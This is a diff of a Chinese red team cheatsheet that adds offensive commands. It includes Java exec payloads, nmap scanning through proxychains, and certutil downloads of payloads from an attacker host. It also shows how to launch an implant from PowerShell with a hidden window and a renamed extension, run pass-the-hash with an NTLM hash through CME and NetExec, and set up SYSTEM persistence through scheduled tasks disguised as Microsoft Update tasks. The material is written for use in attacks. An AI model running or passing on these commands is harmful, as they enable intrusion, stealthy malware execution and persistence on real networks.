@@ -8,7 +8,7 @@ red team cheatsheets.
 建议直接[Ctrl+F]查找    
 
 ## java命令执行
-如下编码网站：
+如下编码网站：  
 https://ares-x.com/tools/runtime-exec/    
 https://r0yanx.com/tools/java_exec_encode/    
 https://www.bugku.net/runtime-exec-payloads/   
@@ -21,6 +21,19 @@ bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i
 Windows下
 ```
 getRuntime().exec(\"cmd /c echo 1 > D://tomcat//webapps//ROOT//90s.txt\");
+```
+
+
+绝对路径执行，解决环境变量的问题
+```
+C:\windows\system32\cmd.exe /c whoami
+
+后台运行，但是cmd不能被关闭，不然也会退出
+C:\windows\system32\cmd.exe /b agent.exe
+
+
+/bin/sh -c whoami
+/bin/bash -c whoami
 ```
 
 
@@ -261,6 +274,16 @@ udp发包探测存活，比较慢
 ```
 sudo nmap -sU -Pn 10.11.1.0/24
 ```
+tcp端口
+```
+nmap -sT -Pn 10.11.1.1 -p 22
+```
+
+操作系统识别，代理推荐用proxychains，并且指定端口，不然会扫top1000
+```
+proxychains nmap -Pn -O -sT -v -p 22 -sV 192.168.2.1
+```
+
 多种方式，进行存活探测(TCP ACK、TCP FIN 和 UDP 数据包来探测主机)
 ```
 sudo nmap -PA -Pn 192.168.10.1/24
@@ -1475,6 +1498,20 @@ copy c:\windows\system32\certutil.exe a.exe
 a.exe -urlcache -split -f  http://192.168.xx.xx:7000/gdut.txt
 ```
 
+
+## rdp拉起马儿
+
+RDP桌面下，隐藏窗口启动
+```
+后台运行
+powershell -Command "Start-Process 'agent.exe' -WindowStyle Hidden"
+
+更隐蔽可以把exe后缀也改了，也能正常运行。
+
+powershell -Command "Start-Process 'agent.xxx' -WindowStyle Hidden"
+```
+
+
 ## bitsadmin
 
 **不支持https、ftp协议，php python带的服务器会出错**
@@ -1787,6 +1824,8 @@ shell for /f %i in (ok.txt) do dir \\%i\c$\users >>result.txt
 ```
 
 
+## cme&&netexec
+
 cme 批量
 ```
 proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x "net user"
@@ -1861,7 +1900,18 @@ nxc <protocol> <target(s)> -u username -p password
 nxc <protocol> <IP> -d <DOMAIN> -u Administrator -p 'password'
 ```
 
-使用
+信息收集使用，收集版本信息。
+记得编辑/etc/proxychains.conf 把quiet_mode，打开。不然数据太乱
+```
+ssh信息
+proxychains nxc ssh 192.168.0.1/24
+
+smb收集主机信息
+proxychains nxc smb 192.168.0.1/24
+```
+
+
+exp使用
 ```
 
 
@@ -2044,8 +2094,15 @@ sc create evil binpath= "cmd.exe /k [Absolute Path]evil.exe" start= "auto" obj= 
 
 ### 计划任务
 
+注意：C:\programData目录默认是隐藏的
 ```
-SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe
+
+SYSTEM 权限，开机自启
+
+SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\Update\task1 /TR C:\programData\update.exe /F
+
+晚上23：45执行
+SCHTASKS /Create /RU SYSTEM /RL HIGHEST /SC DAILY /TN \Microsoft\Windows\Update\task2 /TR "C:\programData\update.exe" /ST 23:45 /F
 ```
 
 ### WMI事件
